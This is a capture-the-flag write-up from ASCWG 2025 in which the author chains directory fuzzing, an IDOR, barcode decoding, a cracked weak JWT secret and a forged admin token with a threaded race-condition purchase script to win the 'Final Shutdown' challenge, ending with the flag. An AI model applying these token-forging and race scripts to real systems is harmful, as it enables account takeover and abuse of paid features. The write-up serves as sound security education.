---
categories:
  - ASCWG
image:
  path: /assets/posts/Final shutdown/preview.jpg
layout: post
stags:
title: Final Shutdown
---

**Final Shutdown** was an awesome challenge I tackled during ASCWG 2025 — and guess what? I got **first blood** on it! This one had a mix of JWT forging, IDOR, and a sneaky race condition at the end. Super satisfying to solve from start to finish. Here's my full writeup on how I broke it down and took the car offline. Let’s dive in!


![](/assets/posts/Final shutdown/Final%20shutdown,.png)


We start off with a login page, so the first step was to register an account and log in.


![](/assets/posts/Final shutdown/Final%20shutdown,-1.png)

There wasn’t much of interest after logging in the functionality was pretty limited. So, I turned my attention to the JWT token we received.

![](/assets/posts/Final shutdown/Final%20shutdown,-4.png)

From the decoded token, we can see that the most relevant fields in the payload are `userId` and `vinCode`. That got me thinking: **What if we can find the `userId` of an admin and forge a valid token?** With not much else to go on, I began fuzzing directories to look for anything useful.

![](/assets/posts/Final shutdown/Final%20shutdown,-5.png)

Sure enough, I discovered a `/Car` directory.

![](/assets/posts/Final shutdown/Final%20shutdown,-6.png)

And it disclosed some user IDs! Referring back to the profile page, I noticed that the URL looked like this:

```
http://IP:PORT/profile.html?id=6667abb5-2d44-40b0-9430-69f1add3ef20
```

So I tested for an **IDOR (Insecure Direct Object Reference)** vulnerability by replacing the `id` parameter with some of the user IDs I found.

![](/assets/posts/Final shutdown/Final%20shutdown,-7.png)

Boom — it worked! I could access information about another user, and in this case, it turned out to be an admin. While I wasn't logged in as them, I now had **part of the data needed to forge a token**.

Looking closely at the profile, I noticed a barcode image.

![](/assets/posts/Final shutdown/Final%20shutdown,-8.png)

The image source was `/image/vin`, which I could download directly. I downloaded the barcode and ran it through an online barcode reader to extract its contents.

![](/assets/posts/Final shutdown/Final%20shutdown,-9.png)

That gave me the admin's `vinCode`. So now I had both the `userId` **and** `vinCode` of an admin user. The next step was to **forge the JWT token**.

I first tried to downgrade the algorithm to `"none"`, but that didn't work. So I tried brute-forcing the key — and sure enough, the secret key was **crackable**. I found it to be:


![](/assets/posts/Final shutdown/Final%20shutdown,-10.png)

we got it as **automotive**

Now I could forge a token that impersonated the admin user:

```python
import jwt

payload = {
    "userId": "f05f59c7-2227-44f3-8f57-2c74561250ea",
    "vinCode": "5YJSA1DN0CFS00187",
    "model": "Model X",
    "iat": 1754067093,
    "exp": 1794171999
}

secret = "automotive"

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

wrote this script to generate a jwt token 

![](/assets/posts/Final shutdown/Final%20shutdown,-11.png)

But there's one last thing: we still needed to **shut down the car**.

![](/assets/posts/Final shutdown/Final%20shutdown,-12.png)

Clicking the shutdown button showed a message saying we needed **at least 15 cubes** to shut down the vehicle. At the top of the screen, we could see we only had 5 cubes.

Time to get clever  the "Buy Selected Vehicle" button caught my eye. My first thought: **race condition**. What if we triggered multiple purchases at the same time? Each car costs 5 cubes, and we have 5. Maybe if we buy all three in parallel, we can trick the system.

After checking the network traffic, I found the endpoint:

```
http://IP:PORT/admin-cupe/buy
```
It takes a POST request with the following structure:

```
{
  "itemId": "item1",  // or item2, item3
  "itemOn": true
}
```

So I wrote this Python script to send requests for all three cars **at the same time** using threads:

```python
import threading
import requests

url = "http://34.9.3.251:3001/admin-cupe/buy"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJjYzkxNDZjNy1jODdjLTQ3MTEtOTA2Zi1kYWJiYzMxMWM5ZGUiLCJ2aW5Db2RlIjoiNVlKU0ExRE4wQ0ZTMDAxODciLCJtb2RlbCI6Ik1vZGVsIFkiLCJpYXQiOjE3NTQwNjcwOTMsImV4cCI6MTc1NDk3MTk5OX0.3C1tlaJzwnf7woQIYJleHWiT9tYpK8Bu6K4dbYJDvSk"

headers = {
    "Host": "34.9.3.251:3001",
    "Content-Type": "application/json",
    "Cookie": f"token={token}"
}

def buy_item(item_id):
    payload = {
        "itemId": item_id,
        "itemOn": True
    }
    try:
        r = requests.post(url, headers=headers, json=payload)
        print(f"[{item_id}] => {r.status_code} - {r.text}")
    except Exception as e:
        print(f"[{item_id}] Error: {e}")

items = ["item1", "item2", "item3"]
threads = []

for item in items:
    t = threading.Thread(target=buy_item, args=(item,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
```


![](/assets/posts/Final shutdown/Final%20shutdown,-13.png)

Success we now had **three cars purchased**, meaning we could **refund them and gain enough cubes** to shut down the vehicle.

![](/assets/posts/Final shutdown/Final%20shutdown,-14.png)

```
ASCWG{Y0u_H@v3_T4k3n_Th3_V3h!cl3_D0wn_Y0u_4r3_Th3_R34L_C@r_H@ck3r_!_}
```
It was an awesome challenge that combined multiple web vulns JWT manipulation, IDOR, and race conditions into one tight scenario. And claiming first blood made it even sweeter.